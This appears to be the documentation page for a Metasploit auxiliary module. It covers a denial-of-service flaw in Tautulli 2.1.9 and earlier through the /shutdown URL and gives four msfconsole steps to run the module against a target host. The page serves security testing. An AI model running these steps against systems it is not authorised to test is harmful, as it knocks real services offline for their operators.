## Overview
Tautulli versions 2.1.9 and prior are vulnerable to denial of service via the /shutdown URL.

## Scenario

![72550314-80cd8a00-38a3-11ea-9bad-942668a29390](https://user-images.githubusercontent.com/15425071/72602337-29bdc880-3928-11ea-8aec-ddadb3ff4f2d.png)

## Verification Steps :

```
List the steps needed to make sure this thing works

1. Start ```msfconsole```
2. ```use auxiliary/dos/http/tautulli_shutdown_exec```
3. ```set RHOSTS XXX.XXX.XXX.XXX```
4. ```run```
```
